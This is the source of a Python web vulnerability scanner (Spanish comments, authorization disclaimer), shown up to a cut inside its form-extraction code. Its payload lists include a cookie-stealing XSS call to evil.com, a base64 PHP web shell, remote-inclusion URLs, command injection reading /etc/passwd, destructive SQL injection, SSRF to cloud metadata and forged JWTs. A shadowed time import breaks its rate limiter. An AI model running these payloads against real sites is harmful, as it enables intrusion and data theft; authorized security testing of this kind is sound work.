
#!/usr/bin/env python3
"""
Basic Web Vulnerability Scanner

AVISO LEGAL:
Esta herramienta debe usarse ÚNICAMENTE en sistemas y aplicaciones web donde tengas
autorización explícita por escrito. El uso no autorizado viola leyes de seguridad informática.
El autor no se hace responsable del mal uso de esta herramienta.

Requisitos:
pip install requests beautifulsoup4 colorama

Características básicas:
1. Escaneo de vulnerabilidades web comunes
2. Interfaz de línea de comandos simple
3. Reportes en formato texto plano
4. Detección de XSS y SQL Injection básicos
5. Verificación de headers de seguridad
"""

import sys
import time
import argparse
import concurrent.futures
import json
import re
import urllib.parse
import os
import random
import logging
import csv
import yaml
import socket
import hashlib
import base64
import shutil
import tempfile
import cmd

# Manejo condicional de readline según plataforma
if os.name == 'posix':  # Linux/Mac
    try:
        import readline
    except ImportError:
        readline = None
elif os.name == 'nt':  # Windows
    try:
        import pyreadline3 as readline
    except ImportError:
        try:
            # Alternativa: gnureadline
            import gnureadline as readline
        except ImportError:
            try:
                # Última opción: usar el readline incorporado
                import readline
            except ImportError:
                readline = None
else:
    readline = None

import shlex     # Para separar argumentos correctamente
from datetime import datetime, date, time
from pathlib import Path
from typing import Dict, List, Set, Tuple, Any, Optional, Union, Callable

# Custom JSON encoder for datetime objects
class DateTimeEncoder(json.JSONEncoder):
    """
    Encoder JSON personalizado para manejar objetos datetime.
    
    Permite la serialización de objetos datetime a formato ISO 8601.
    Ejemplo de uso:
        json.dumps(data, cls=DateTimeEncoder)
    """
    def default(self, obj):
        if isinstance(obj, datetime):
            return obj.strftime('%Y-%m-%d %H:%M:%S')
        # También manejar objetos date
        elif isinstance(obj, date):
            return obj.strftime('%Y-%m-%d')
        # También manejar objetos time
        elif isinstance(obj, time):
            return obj.strftime('%H:%M:%S')
        return super().default(obj)

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    
    from bs4 import BeautifulSoup
    import colorama
    from colorama import Fore, Style
    import nmap
    import dns.resolver
    from tqdm import tqdm
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
except ImportError as e:
    print(f"Error: Falta la dependencia: {e.name}")
    print("Ejecuta: pip install requests beautifulsoup4 colorama python-nmap dnspython tqdm pyyaml cryptography")
    sys.exit(1)

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("webscrapper.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("WebVulnScanner")

# Inicialización de colorama
colorama.init(autoreset=True)

# Constantes
VERSION = "2.0.0"
DEFAULT_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
DEFAULT_CONFIG_FILE = "scanner_config.yaml"
MAX_URL_LENGTH = 2000  # RFC 7230 sugiere este límite para URLs
DATA_DIR = Path(os.path.expanduser("~")) / ".webvulnscan"

# Asegurar que el directorio de datos exista
DATA_DIR.mkdir(exist_ok=True)

# Payloads comunes por tipo de vulnerabilidad
class Payloads:
    """Clase con payloads organizados por tipo de vulnerabilidad"""
    
    XSS = [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '"><img src=x onerror=alert("XSS")>',
        '\'><script>fetch("https://evil.com?cookie="+document.cookie)</script>',
        '<svg/onload=alert("XSS")>',
        'javascript:alert("XSS")'
    ]
    
    SQL_INJECTION = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT 1,2,3,4,5 --",
        "' AND (SELECT 9447 FROM (SELECT(SLEEP(3)))xZWu) AND 'xZWu'='xZWu",
        '1; DROP TABLE users-- ',
        "admin' --",
        "admin' OR 1=1--",
        "'); waitfor delay '0:0:3'--",
        "1)) OR sleep(3)#",
        "1' AND SLEEP(3) AND '1'='1"
    ]
    
    LOCAL_FILE_INCLUSION = [
        "../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "/etc/passwd",
        "C:\\Windows\\win.ini",
        "file:///etc/passwd",
        "....//....//....//etc/passwd",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
        "/var/log/apache/access.log"
    ]
    
    REMOTE_FILE_INCLUSION = [
        "http://evil.com/shell.txt",
        "https://pastebin.com/raw/abcdef",
        "https://raw.githubusercontent.com/user/repo/master/shell.php",
        "data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
    ]
    
    OPEN_REDIRECT = [
        "https://evil.com",
        "//evil.com",
        "https:evil.com",
        "https://evil.com%2F@example.com",
        "javascript:alert(document.domain)"
    ]
    
    SSRF = [
        "http://localhost",
        "http://127.0.0.1",
        "http://[::1]",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal",
        "http://0.0.0.0",
        "http://0177.0.0.1"
    ]
    
    XXE = [
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://localhost:22">]><foo>&xxe;</foo>'
    ]
    
    COMMAND_INJECTION = [
        "; cat /etc/passwd",
        "& dir",
        "| ls -la",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; ping -c 3 localhost",
        "| ping -n 3 localhost",
        "& ping -c 3 localhost",
        "%0Acat%20/etc/passwd"
    ]
    
    PASSWORD_RESET = [
        {"username": "admin", "email": "attacker@evil.com"},
        {"email": "victim@example.com"},
        {"user": "admin"},
        {"email": "victim@example.com", "code": "000000"}
    ]
    
    JWT_ATTACKS = [
        # None alg
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6IjEiLCJ1c2VybmFtZSI6ImFkbWluIn0.",
        # Weak signature
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEiLCJ1c2VybmFtZSI6ImFkbWluIn0.2QKm6TGhCQrFBK5HKGXKs9vnLMT9yIQDjVwq7V3eT9c",
    ]
    
    # Patrones de detector de vulnerabilidades
    LFI_PATTERNS = [
        "root:x:",
        "\\[fonts\\]",
        "\\[extensions\\]",
        "sbin",
        "\\[boot loader\\]",
        "Failed to open stream",
        "include_path",
        "No such file or directory"
    ]
    
    SQL_ERROR_PATTERNS = [
        "sql syntax",
        "syntax error",
        "mysql_fetch",
        "mysql_num_rows",
        "mysql_query",
        "pg_query",
        "ORA-",
        "Microsoft SQL Native Client",
        "Microsoft OLE DB Provider for SQL Server",
        "Unclosed quotation mark",
        "ODBC Driver",
        "SQLite3::",
        "System.Data.SQLite"
    ]
    
    XXE_PATTERNS = [
        "root:x:",
        "Password:",
        "Environment Variables",
        "Connection refused",
        "DOCTYPE",
        "resolving entity"
    ]
    
    COMMAND_EXEC_PATTERNS = [
        "uid=",
        "gid=",
        "groups=",
        "Linux ",
        "Windows ",
        "Directory of ",
        "Volume Serial Number is "
    ]


class Config:
    """Maneja la configuración del escáner."""
    
    def __init__(self):
        self.config = {
            "general": {
                "threads": 5,
                "timeout": 10,
                "max_depth": 3,
                "max_urls": 500,
                "verbose": False,
                "user_agent": DEFAULT_USER_AGENT,
                "verify_ssl": False,
                "follow_redirects": True,
                "max_redirects": 5,
                "rate_limit": 0  # Solicitudes por segundo (0 = sin límite)
            },
            "scan": {
                "xss": True,
                "sqli": True,
                "lfi": True,
                "rfi": True,
                "open_redirect": True,
                "ssrf": True,
                "xxe": True,
                "command_injection": True,
                "jwt": True,
                "csrf": True,
                "port_scan": True,
                "subdomain_scan": False,  # Más invasivo, desactivado por defecto
                "brute_force": False  # Más invasivo, desactivado por defecto
            },
            "output": {
                "format": "all",  # "json", "html", "csv" o "all"
                "directory": "scan_results"
            },
            "proxy": {
                "enabled": False,
                "http": "",
                "https": ""
            },
            "authentication": {
                "enabled": False,
                "type": "form",  # "form", "basic", "digest", "ntlm"
                "url": "",
                "username": "",
                "password": "",
                "form_user_field": "username",
                "form_pass_field": "password",
                "login_check": ""  # Texto que confirma inicio de sesión exitoso
            },
            "custom_headers": {},
            "excluded_urls": [],
            "excluded_extensions": [
                ".pdf", ".jpg", ".jpeg", ".png", ".gif", ".svg", ".css",
                ".ico", ".woff", ".woff2", ".ttf", ".eot", ".mp4",
                ".webm", ".zip", ".tar.gz", ".mp3", ".wav"
            ]
        }
    
    def load_from_file(self, filename):
        """Carga la configuración desde un archivo YAML."""
        try:
            with open(filename, 'r') as f:
                config = yaml.safe_load(f)
                self._update_config(config)
                logger.info(f"Configuración cargada desde {filename}")
        except Exception as e:
            logger.warning(f"Error al cargar configuración: {str(e)}. Usando valores predeterminados.")
    
    def _update_config(self, new_config):
        """Actualiza la configuración recursivamente."""
        def update_dict(target, source):
            for key, value in source.items():
                if isinstance(value, dict) and key in target:
                    update_dict(target[key], value)
                else:
                    target[key] = value
        
        update_dict(self.config, new_config)
    
    def save_to_file(self, filename):
        """Guarda la configuración actual en un archivo YAML."""
        try:
            with open(filename, 'w') as f:
                yaml.dump(self.config, f, default_flow_style=False)
            logger.info(f"Configuración guardada en {filename}")
        except Exception as e:
            logger.error(f"Error al guardar configuración: {str(e)}")
    
    def get(self, *args, default=None):
        """Obtiene un valor de configuración, soporta acceso anidado y valores por defecto."""
        result = self.config
        
        # Sin argumentos, devuelve toda la configuración
        if not args:
            return result
        
        # Navegar por la estructura anidada
        for i, arg in enumerate(args):
            if isinstance(result, dict) and arg in result:
                result = result[arg]
            else:
                # Si no encuentra la clave y hay un valor por defecto, devolver el valor por defecto
                return default
        
        # Si el resultado es None y hay un valor por defecto, devolver el valor por defecto
        if result is None and default is not None:
            return default
            
        return result
    
    def set(self, value, *args):
        """Establece un valor de configuración, soporta acceso anidado."""
        if not args:
            return
        
        target = self.config
        for arg in args[:-1]:
            if arg not in target:
                target[arg] = {}
            target = target[arg]
        
        target[args[-1]] = value


class RequestManager:
    """Maneja todas las solicitudes HTTP con limitación de tasa, proxies, etc."""
    
    def __init__(self, config):
        self.config = config
        self.session = self._create_session()
        self.last_request_time = 0
        self.request_count = 0
        self.cache = {}  # Caché simple para respuestas
    
    def _create_session(self):
        """Crea y configura una sesión de requests."""
        session = requests.Session()
        
        # Configurar User-Agent
        user_agent = self.config.get("general", "user_agent")
        
        # Configurar headers básicos
        session.headers.update({
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        })
        
        # Añadir headers personalizados
        custom_headers = self.config.get("custom_headers")
        if custom_headers:
            session.headers.update(custom_headers)
        
        # Configurar proxies si están habilitados
        if self.config.get("proxy", "enabled"):
            proxies = {
                'http': self.config.get("proxy", "http"),
                'https': self.config.get("proxy", "https")
            }
            session.proxies.update(proxies)
        
        # Configurar verificación SSL
        session.verify = self.config.get("general", "verify_ssl")
        
        return session
    
    def _apply_rate_limit(self):
        """Aplica limitación de tasa si está configurada."""
        rate_limit = self.config.get("general", "rate_limit")
        if rate_limit > 0:
            current_time = time.time()
            elapsed = current_time - self.last_request_time
            min_interval = 1.0 / rate_limit
            
            if elapsed < min_interval:
                time.sleep(min_interval - elapsed)
            
            self.last_request_time = time.time()
    
    def authenticate(self):
        """Realiza la autenticación si está configurada."""
        if not self.config.get("authentication", "enabled"):
            return True
        
        auth_type = self.config.get("authentication", "type")
        auth_url = self.config.get("authentication", "url")
        username = self.config.get("authentication", "username")
        password = self.config.get("authentication", "password")
        
        if auth_type == "form":
            form_user = self.config.get("authentication", "form_user_field")
            form_pass = self.config.get("authentication", "form_pass_field")
            login_check = self.config.get("authentication", "login_check")
            
            data = {
                form_user: username,
                form_pass: password
            }
            
            try:
                response = self.session.post(auth_url, data=data)
                
                if login_check and login_check not in response.text:
                    logger.error("Autenticación fallida: no se encontró el texto de confirmación")
                    return False
                
                return response.status_code < 400
                
            except Exception as e:
                logger.error(f"Error durante la autenticación: {str(e)}")
                return False
                
        elif auth_type == "basic":
            self.session.auth = (username, password)
            return True
            
        elif auth_type == "digest":
            from requests.auth import HTTPDigestAuth
            self.session.auth = HTTPDigestAuth(username, password)
            return True
            
        elif auth_type == "ntlm":
            try:
                from requests_ntlm import HttpNtlmAuth
                self.session.auth = HttpNtlmAuth(username, password)
                return True
            except ImportError:
                logger.error("Para autenticación NTLM, instala: pip install requests_ntlm")
                return False
        
        return False
    
    def get(self, url, params=None, allow_redirects=None, cache=True, **kwargs):
        """Realiza una solicitud GET con todas las configuraciones aplicadas."""
        # Generar una clave única para la caché
        cache_key = None
        if cache:
            cache_key = f"GET:{url}:{json.dumps(params) if params else ''}"
            if cache_key in self.cache:
                logger.debug(f"Cache hit para {url}")
                return self.cache[cache_key]
        
        self._apply_rate_limit()
        
        # Configurar redirecciones
        if allow_redirects is None:
            allow_redirects = self.config.get("general", "follow_redirects")
        
        max_redirects = self.config.get("general", "max_redirects")
        timeout = self.config.get("general", "timeout")
        
        try:
            response = self.session.get(
                url, 
                params=params,
                allow_redirects=allow_redirects,
                timeout=timeout,
                **kwargs
            )
            
            self.request_count += 1
            
            # Guardar en caché si es necesario
            if cache and cache_key:
                self.cache[cache_key] = response
            
            return response
            
        except requests.RequestException as e:
            logger.debug(f"Error en GET {url}: {str(e)}")
            raise
    
    def post(self, url, data=None, json=None, **kwargs):
        """Realiza una solicitud POST con todas las configuraciones aplicadas."""
        self._apply_rate_limit()
        
        allow_redirects = kwargs.get('allow_redirects', 
                                     self.config.get("general", "follow_redirects"))
        timeout = self.config.get("general", "timeout")
        
        try:
            response = self.session.post(
                url,
                data=data,
                json=json,
                allow_redirects=allow_redirects,
                timeout=timeout,
                **kwargs
            )
            
            self.request_count += 1
            return response
            
        except requests.RequestException as e:
            logger.debug(f"Error en POST {url}: {str(e)}")
            raise
    
    def put(self, url, data=None, **kwargs):
        """Realiza una solicitud PUT."""
        self._apply_rate_limit()
        timeout = self.config.get("general", "timeout")
        
        try:
            response = self.session.put(url, data=data, timeout=timeout, **kwargs)
            self.request_count += 1
            return response
        except requests.RequestException as e:
            logger.debug(f"Error en PUT {url}: {str(e)}")
            raise
    
    def delete(self, url, **kwargs):
        """Realiza una solicitud DELETE."""
        self._apply_rate_limit()
        timeout = self.config.get("general", "timeout")
        
        try:
            response = self.session.delete(url, timeout=timeout, **kwargs)
            self.request_count += 1
            return response
        except requests.RequestException as e:
            logger.debug(f"Error en DELETE {url}: {str(e)}")
            raise
    
    def send_raw(self, method, url, **kwargs):
        """Envía una solicitud con un método específico."""
        self._apply_rate_limit()
        timeout = self.config.get("general", "timeout")
        
        try:
            response = self.session.request(method, url, timeout=timeout, **kwargs)
            self.request_count += 1
            return response
        except requests.RequestException as e:
            logger.debug(f"Error en {method} {url}: {str(e)}")
            raise
    
    def clear_cache(self):
        """Limpia la caché de solicitudes."""
        self.cache.clear()


class VulnerabilityScanner:
    """Escáner principal de vulnerabilidades web."""
    
    def __init__(self, target_url, config_file=None):
        # Inicialización de la configuración
        self.config = Config()
        if config_file:
            self.config.load_from_file(config_file)
        
        # Normalizar URL
        self.target_url = target_url if target_url.startswith(('http://', 'https://')) else 'http://' + target_url
        self.base_url = urllib.parse.urlparse(self.target_url).netloc
        
        # Inicializar gestor de solicitudes
        self.request_manager = RequestManager(self.config)
        
        # Autenticar si es necesario
        if self.config.get("authentication", "enabled"):
            if not self.request_manager.authenticate():
                logger.error("Fallo en la autenticación. El escaneo puede estar limitado.")
        
        # Estructuras para almacenamiento de datos
        self.discovered_urls = set()
        self.forms = []
        self.api_endpoints = []
        self.vulnerabilities = []
        self.scan_stats = {
            "start_time": None,
            "end_time": None,
            "requests_sent": 0,
            "urls_discovered": 0,
            "forms_analyzed": 0,
            "vulnerabilities_found": 0
        }
        
        # Crea un directorio para resultados
        self.output_dir = Path(self.config.get("output", "directory"))
        self.output_dir.mkdir(exist_ok=True)
        
        # Inicializar barra de progreso
        self.progress_bar = None
        
        logger.info(f"Escáner inicializado para {self.target_url}")
    
    def scan(self):
        """Ejecuta el escaneo completo de vulnerabilidades."""
        try:
            self.scan_stats["start_time"] = datetime.now()
            
            # Banner inicial
            self._print_banner()
            
            # Información general del sitio
            logger.info("Obteniendo información del sitio...")
            self.get_site_info()
            
            # Descubrir URLs
            logger.info("Iniciando descubrimiento de URLs...")
            self.crawl(self.target_url, depth=self.config.get("general", "max_depth"))
            logger.info(f"Descubiertas {len(self.discovered_urls)} URLs")
            
            # Limitar el número de URLs para analizar si hay demasiadas
            urls_to_scan = self.discovered_urls
            max_urls = self.config.get("general", "max_urls")
            
            if len(urls_to_scan) > max_urls:
                logger.warning(f"Limitando el análisis a {max_urls} URLs (de {len(urls_to_scan)} descubiertas)")
                urls_to_scan = set(list(urls_to_scan)[:max_urls])
            
            # Escaneo de puertos si está habilitado
            if self.config.get("scan", "port_scan"):
                logger.info("Realizando escaneo básico de puertos...")
                self.port_scan()
            
            # Inicializar barra de progreso para el escaneo
            total_tasks = len(urls_to_scan) * 5  # Aproximado
            self.progress_bar = tqdm(total=total_tasks, desc="Analizando vulnerabilidades", 
                                    unit="prueba", ncols=100)
            
            # Ejecución paralela de pruebas
            logger.info(f"Analizando vulnerabilidades en {len(urls_to_scan)} URLs...")
            
            threads = self.config.get("general", "threads")
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                # Pruebas basadas en URL
                url_futures = [executor.submit(self.check_url_vulnerabilities, url) for url in urls_to_scan]
                
                # Extraer formularios mientras se ejecutan los escaneos anteriores
                self.extract_forms(urls_to_scan)
                logger.info(f"Encontrados {len(self.forms)} formularios")
                
                # Pruebas basadas en formularios
                form_futures = [executor.submit(self.check_form_vulnerabilities, form) for form in self.forms]
                
                # Esperar a que todos los futuros se completen
                for future in concurrent.futures.as_completed(url_futures + form_futures):
                    try:
                        future.result()
                    except Exception as e:
                        logger.error(f"Error en una tarea: {str(e)}")
            
            if self.progress_bar:
                self.progress_bar.close()
            
            # Finalizar el escaneo y mostrar resultados
            self.scan_stats["end_time"] = datetime.now()
            self.scan_stats["requests_sent"] = self.request_manager.request_count
            self.scan_stats["urls_discovered"] = len(self.discovered_urls)
            self.scan_stats["forms_analyzed"] = len(self.forms)
            self.scan_stats["vulnerabilities_found"] = len(self.vulnerabilities)
            
            # Mostrar resumen
            elapsed_time = (self.scan_stats["end_time"] - self.scan_stats["start_time"]).total_seconds()
            self.print_summary(elapsed_time)
            
            # Guardar resultados
            self.save_results()
            
            return self.vulnerabilities
            
        except KeyboardInterrupt:
            logger.warning("Escaneo interrumpido por el usuario")
            if self.progress_bar:
                self.progress_bar.close()
            return self.vulnerabilities
        except Exception as e:
            logger.error(f"Error durante el escaneo: {str(e)}")
            if self.progress_bar:
                self.progress_bar.close()
            raise
    
    def _print_banner(self):
        """Muestra un banner de inicio del escaneo."""
        print("\n" + "="*70)
        print(f"{Fore.CYAN}    Advanced Web Vulnerability Scanner v{VERSION}")
        print(f"{Fore.CYAN}    Target: {Fore.YELLOW}{self.target_url}")
        print(f"{Fore.CYAN}    Timestamp: {Fore.YELLOW}{self.scan_stats['start_time'].strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*70 + "\n")
    
    def get_site_info(self):
        """Obtiene información general del sitio."""
        try:
            response = self.request_manager.get(self.target_url)
            
            print(f"{Fore.BLUE}[+] Información General:")
            
            # Información de servidor y tecnologías
            server = response.headers.get('Server', 'No detectado')
            print(f"{Fore.BLUE}  - Servidor: {Fore.WHITE}{server}")
            
            technologies = self.detect_technologies(response)
            tech_str = ', '.join(technologies) if technologies else 'No detectadas'
            print(f"{Fore.BLUE}  - Tecnologías: {Fore.WHITE}{tech_str}")
            
            # Análisis de encabezados de seguridad
            security_headers = self.check_security_headers(response)
            missing_headers = [h for h, present in security_headers.items() if not present]
            if missing_headers:
                print(f"{Fore.YELLOW}  - Encabezados de seguridad faltantes: {Fore.WHITE}{', '.join(missing_headers)}")
            else:
                print(f"{Fore.GREEN}  - Todos los encabezados de seguridad principales están presentes")
            
            # Certificado SSL
            if self.target_url.startswith('https://'):
                ssl_info = self.check_ssl_certificate()
                if ssl_info["valid"]:
                    print(f"{Fore.GREEN}  - Certificado SSL válido hasta: {Fore.WHITE}{ssl_info['valid_until']}")
                else:
                    print(f"{Fore.RED}  - Problemas con el certificado SSL: {Fore.WHITE}{ssl_info['error']}")
            
            # Análisis DNS
            try:
                answers = dns.resolver.resolve(self.base_url, 'A')
                ip = answers[0].to_text()
                print(f"{Fore.BLUE}  - Dirección IP: {Fore.WHITE}{ip}")
                
                # GeoIP (si está disponible)
                try:
                    location = self.get_geolocation(ip)
                    if location:
                        print(f"{Fore.BLUE}  - Ubicación: {Fore.WHITE}{location}")
                except:
                    pass
                
            except Exception:

                print(f"{Fore.YELLOW}  - No se pudo resolver el DNS")
                
        except Exception as e:
            logger.error(f"Error al obtener información del sitio: {str(e)}")
            print(f"{Fore.RED}[!] Error al obtener información del sitio: {str(e)}")
    
    def check_security_headers(self, response):
        """Verifica los encabezados de seguridad en una respuesta HTTP."""
        security_headers = {
            'Strict-Transport-Security': False,
            'Content-Security-Policy': False,
            'X-Content-Type-Options': False,
            'X-Frame-Options': False,
            'X-XSS-Protection': False,
            'Referrer-Policy': False,
            'Permissions-Policy': False
        }
        
        for header in security_headers:
            if header in response.headers:
                security_headers[header] = True
        
        return security_headers
    
    def check_ssl_certificate(self):
        """Verifica el certificado SSL del sitio."""
        result = {
            "valid": False,
            "valid_until": None,
            "error": None
        }
        
        if not self.target_url.startswith('https://'):
            result["error"] = "El sitio no usa HTTPS"
            return result
        
        try:
            import ssl
            import socket
            from datetime import datetime
            
            hostname = self.base_url
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Validar fechas
                    not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    not_before = datetime.strptime(cert['notBefore'], '%b %d %H:%M:%S %Y %Z')
                    
                    result["valid_until"] = not_after.strftime('%Y-%m-%d')
                    
                    if datetime.now() > not_after:
                        result["error"] = "Certificado expirado"
                    elif datetime.now() < not_before:
                        result["error"] = "Certificado aún no válido"
                    else:
                        result["valid"] = True
                        
            return result
            
        except Exception as e:
            result["error"] = str(e)
            return result
    
    def get_geolocation(self, ip):
        """Obtiene información geográfica aproximada de una IP."""
        try:
            # Método simple sin dependencias externas
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect(("www.example.com", 80))
                local_ip = s.getsockname()[0]
            
            if ip == local_ip or ip.startswith("192.168.") or ip.startswith("10.") or ip.startswith("172.16."):
                return "Red local"
            
            # En una implementación real, usarías un servicio o base de datos GeoIP
            # Por ejemplo: https://ipinfo.io/
            # O librerías como geoip2
            
            return None
            
        except Exception as e:
            logger.debug(f"Error al obtener geolocalización: {str(e)}")
            return None
    
    def detect_technologies(self, response):
        """Detecta tecnologías utilizadas en el sitio web."""
        technologies = []
        
        # Detección por cabeceras
        headers = response.headers
        if 'X-Powered-By' in headers:
            technologies.append(headers['X-Powered-By'])
        
        if 'Server' in headers:
            server = headers['Server']
            if 'Apache' in server:
                technologies.append('Apache')
            elif 'nginx' in server:
                technologies.append('Nginx')
            elif 'Microsoft-IIS' in server:
                technologies.append('IIS')
        
        # Detección por cookies
        cookies = response.cookies
        for cookie in cookies:
            if cookie.name == 'PHPSESSID':
                technologies.append('PHP')
            elif cookie.name == 'JSESSIONID':
                technologies.append('Java')
            elif cookie.name == 'ASP.NET_SessionId':
                technologies.append('ASP.NET')
        
        # Detección por contenido
        html = response.text.lower()
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Frameworks y CMS
        detections = [
            ('wordpress', 'WordPress'),
            ('wp-content', 'WordPress'),
            ('wp-includes', 'WordPress'),
            ('joomla', 'Joomla'),
            ('drupal', 'Drupal'),
            ('magento', 'Magento'),
            ('shopify', 'Shopify'),
            ('woocommerce', 'WooCommerce'),
            ('laravel', 'Laravel'),
            ('django', 'Django'),
            ('flask', 'Flask'),
            ('ruby on rails', 'Ruby on Rails'),
            ('angular', 'Angular'),
            ('react', 'React'),
            ('vue', 'Vue.js'),
            ('jquery', 'jQuery'),
            ('bootstrap', 'Bootstrap')
        ]
        
        for signature, tech in detections:
            if signature in html and tech not in technologies:
                technologies.append(tech)
        
        # Meta tags
        for meta in soup.find_all('meta'):
            if meta.get('name') == 'generator' and meta.get('content'):
                technologies.append(meta['content'])
        
        # JavaScript frameworks (detección básica)
        scripts = soup.find_all('script')
        for script in scripts:
            src = script.get('src', '')
            if src:
                if 'jquery' in src and 'jQuery' not in technologies:
                    technologies.append('jQuery')
                elif 'bootstrap' in src and 'Bootstrap' not in technologies:
                    technologies.append('Bootstrap')
                elif 'react' in src and 'React' not in technologies:
                    technologies.append('React')
                elif 'angular' in src and 'Angular' not in technologies:
                    technologies.append('Angular')
                elif 'vue' in src and 'Vue.js' not in technologies:
                    technologies.append('Vue.js')
        
        return list(set(technologies))
    
    def crawl(self, url, depth=3):
        """Realiza crawling para descubrir URLs."""
        # Verificar profundidad y URLs ya descubiertas
        if depth <= 0 or url in self.discovered_urls:
            return
        
        # Verificar exclusiones
        if self._is_excluded_url(url):
            return
        
        # Añadir URL a las descubiertas
        self.discovered_urls.add(url)
        
        try:
            try:
                # Intentamos obtener la página con un timeout un poco más largo para evitar problemas de conexión
                response = self.request_manager.get(url, timeout=self.config.get("general", "timeout", default=15))
            except requests.RequestException as e:
                if self.config.get("general", "verbose", default=False):
                    logger.warning(f"Error accediendo a {url}: {str(e)}")
                return  # Si no podemos acceder a la URL, simplemente continuamos con otras
            
            if self.config.get("general", "verbose", default=False):
                logger.info(f"Crawling: {url}")
            
            # Verificar si la respuesta es válida y de tipo HTML
            content_type = response.headers.get('Content-Type', '')
            if response.status_code >= 400:
                logger.debug(f"Error {response.status_code} al acceder a {url}")
                return
                
            # Procesar solo si es una respuesta HTML válida
            if 'text/html' in content_type and response.status_code < 300:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Extraer enlaces de varios tipos de elementos
                for element_type in ['a', 'link', 'script', 'iframe', 'frame', 'area', 'form']:
                    for element in soup.find_all(element_type):
                        href = None
                        if element_type == 'form' and element.get('action'):
                            href = element.get('action')
                        else:
                            href = element.get('href') or element.get('src')
                            
                        if not href:
                            continue
                        
                        # Construir URL completa, manejo seguro
                        try:
                            # Ignorar enlaces vacíos, javascript: y mailto:
                            if not href or href.startswith(('javascript:', 'mailto:', 'tel:')):
                                continue
                                
                            full_url = urllib.parse.urljoin(url, href)
                            parsed_url = urllib.parse.urlparse(full_url)
                            
                            # Mantener solo URLs del mismo dominio
                            if parsed_url.netloc == self.base_url:
                                # Normalizar URL
                                normalized_url = urllib.parse.urlunparse((
                                    parsed_url.scheme,
                                    parsed_url.netloc,
                                    parsed_url.path,
                                    parsed_url.params,
                                    parsed_url.query,
                                    ''  # Sin fragmento
                                ))
                                
                                # Verificar longitud máxima y si ya está descubierta
                                if (len(normalized_url) <= MAX_URL_LENGTH and 
                                    normalized_url not in self.discovered_urls and
                                    len(self.discovered_urls) < self.config.get("general", "max_urls", default=500)):
                                    
                                    if self.progress_bar:
                                        self.progress_bar.update(0.1)  # Pequeño avance por URL descubierta
                                    
                                    # Recursión controlada
                                    self.crawl(normalized_url, depth - 1)
                        except Exception as e:
                            logger.debug(f"Error al procesar URL {href}: {str(e)}")
                            continue  # Seguir con el siguiente enlace
        
        except Exception as e:
            logger.debug(f"Error en crawling de {url}: {str(e)}")
            if self.config.get("general", "verbose", default=False):
                logger.warning(f"Error procesando {url}: {str(e)}")

    def _is_excluded_url(self, url):
        """Verifica si una URL debe ser excluida según la configuración."""
        # Verificar exclusiones explícitas
        excluded_urls = self.config.get("excluded_urls", default=[])
        if excluded_urls:
            for excluded in excluded_urls:
                if excluded in url:
                    return True
        
        # Verificar extensiones excluidas
        parsed_url = urllib.parse.urlparse(url)
        path = parsed_url.path.lower()
        
        excluded_extensions = self.config.get("excluded_extensions", default=[])
        if excluded_extensions:
            for ext in excluded_extensions:
                if path.endswith(ext):
                    return True
        
        return False
    
    def extract_forms(self, urls):
        """Extrae formularios de las URLs descubiertas."""
        for url in urls:
            try:
                response = self.request_manager.get(url)
                
                # Procesar solo si es HTML
                if not 'text/html' in response.headers.get('Content-Type', ''):
                    continue
                
                soup = BeautifulSoup(response.text, 'html.parser')
                
                for form in soup.find_all('form'):
                    action = form.get('action', '')
                    method = form.get('method', 'get').lower()
                    
                    # Construir URL completa para el action
                    action_url = urllib.parse.urljoin(url, action) if action else url
                    
                    # Información del formulario
                    form_info = {
                        'id': form.get('id', ''),
                        'name': form.get('name', ''),
                        'action': action_url,
                        'method': method,
                        'enctype': form.get('enctype', 'application/x-www-form-urlencoded'),
                        'inputs': [],
                        'source_url': url
                    }
                    
                    # Recopilar información de los campos
                    for input_tag in form.find_all(['input', 'textarea', 'select']):
                        input_type = input_tag.get('type', 'text')
                        name = input_tag.get('name', '')
                        
                        # Ignorar campos sin nombre
                        if not name:
                            continue
                        
                        input_info = {
                            'name': name,
                            'type': input_type,
                            'id': input_tag.get('id', ''),
                            'value': input_tag.get('value', ''),
                            'required': input_tag.has_attr('required'),
                            'placeholder': input_tag.get('placeholder', '')
                        }
                        
